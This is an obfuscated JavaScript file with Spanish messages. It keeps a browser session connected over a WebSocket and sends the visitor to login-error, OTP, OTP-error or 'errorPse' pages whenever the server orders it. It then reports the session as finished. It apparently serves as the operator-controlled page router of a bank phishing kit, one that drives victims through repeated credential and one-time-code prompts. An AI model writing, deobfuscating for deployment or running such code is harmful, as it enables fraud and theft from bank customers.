function _0x5d16(_0x1d0ab3, _0x455938) {
  const _0x10400c = _0x1040();
  return (
    (_0x5d16 = function (_0x5d168c, _0x14d372) {
      _0x5d168c = _0x5d168c - 0x7b;
      let _0x52d2db = _0x10400c[_0x5d168c];
      return _0x52d2db;
    }),
    _0x5d16(_0x1d0ab3, _0x455938)
  );
}
const _0x1efd4f = _0x5d16;
(function (_0x5d6e74, _0x5b59d0) {
  const _0x30413d = _0x5d16,
    _0x204d11 = _0x5d6e74();
  while (!![]) {
    try {
      const _0x24bbd3 =
        -parseInt(_0x30413d(0x8f)) / 0x1 +
        parseInt(_0x30413d(0x80)) / 0x2 +
        -parseInt(_0x30413d(0x8e)) / 0x3 +
        -parseInt(_0x30413d(0x92)) / 0x4 +
        parseInt(_0x30413d(0x85)) / 0x5 +
        -parseInt(_0x30413d(0x82)) / 0x6 +
        parseInt(_0x30413d(0x9c)) / 0x7;
      if (_0x24bbd3 === _0x5b59d0) break;
      else _0x204d11["push"](_0x204d11["shift"]());
    } catch (_0x9dde50) {
      _0x204d11["push"](_0x204d11["shift"]());
    }
  }
})(_0x1040, 0x19990);
function _0x1040() {
  const _0x2db3a2 = [
    "log",
    "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog",
    "Finalizado",
    "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor.",
    "414648wvburD",
    "./otp.error.html",
    "793140AzTAkX",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "location",
    "596055qHNVWK",
    "dataLogToken",
    "origin",
    "getItem",
    "json",
    "PUT",
    "stringify",
    "./index.error.html",
    "/dataLogs/updateEndDataLog/",
    "327414PewOmt",
    "49198OnxmQm",
    "connect",
    "valid",
    "319536nYkCoG",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Datos\x20recibidos:",
    "valor",
    "end",
    "Bearer\x20",
    "Conectado\x20al\x20WebSocket",
    "error",
    "dataLogId",
    "href",
    "1041061FogjlH",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
  ];
  _0x1040 = function () {
    return _0x2db3a2;
  };
  return _0x1040();
}
const dataLogId = localStorage["getItem"](_0x1efd4f(0x9a)),
  token = localStorage[_0x1efd4f(0x88)](_0x1efd4f(0x86));
(!dataLogId || !token) &&
  (console[_0x1efd4f(0x99)](_0x1efd4f(0x83)),
  alert(_0x1efd4f(0x7b)),
  (window[_0x1efd4f(0x84)]["href"] = "./error.html"));
const socket = io(url, { query: { token: token } });
socket["on"](_0x1efd4f(0x90), () => console[_0x1efd4f(0x7c)](_0x1efd4f(0x98))),
  socket["on"]("connect_error", (_0x472aca) =>
    console[_0x1efd4f(0x99)]("Error\x20de\x20conexión:", _0x472aca["message"])
  ),
  socket["on"]("data", async (_0x49ce26) => {
    const _0x518f79 = _0x1efd4f;
    console[_0x518f79(0x7c)](_0x518f79(0x94), _0x49ce26),
      console[_0x518f79(0x7c)]("ID\x20de\x20dataLog:", dataLogId);
    if (String(_0x49ce26[_0x518f79(0x91)]) !== String(dataLogId)) return;
    const _0x4c7e2d = {
      us: _0x518f79(0x8c),
      din: "./otp.html",
      new_din: _0x518f79(0x81),
      end: "./errorPse.html",
    };
    if (_0x49ce26[_0x518f79(0x95)] in _0x4c7e2d) {
      if (_0x49ce26[_0x518f79(0x95)] === _0x518f79(0x96))
        try {
          await updateStatus();
        } catch (_0x9a28f2) {
          console[_0x518f79(0x99)](
            "Error\x20al\x20actualizar\x20el\x20estado:",
            _0x9a28f2
          ),
            alert(_0x518f79(0x93));
          return;
        }
      window[_0x518f79(0x84)][_0x518f79(0x9b)] = _0x4c7e2d[_0x49ce26["valor"]];
    }
  });
async function updateStatus() {
  const _0x1b7611 = _0x1efd4f;
  try {
    const _0x267a69 = await fetch(url + _0x1b7611(0x8d) + dataLogId, {
      method: _0x1b7611(0x8a),
      headers: {
        "Content-Type": "application/json",
        Authorization: _0x1b7611(0x97) + token,
        Origin: window["location"][_0x1b7611(0x87)],
      },
      body: JSON[_0x1b7611(0x8b)]({ status: _0x1b7611(0x7e) }),
    });
    if (!_0x267a69["ok"]) {
      const _0x3c45cb = await _0x267a69[_0x1b7611(0x89)]();
      throw new Error(_0x3c45cb[_0x1b7611(0x99)] || _0x1b7611(0x7d));
    }
    console[_0x1b7611(0x7c)](_0x1b7611(0x7f));
  } catch (_0x188b3e) {
    throw _0x188b3e;
  }
}
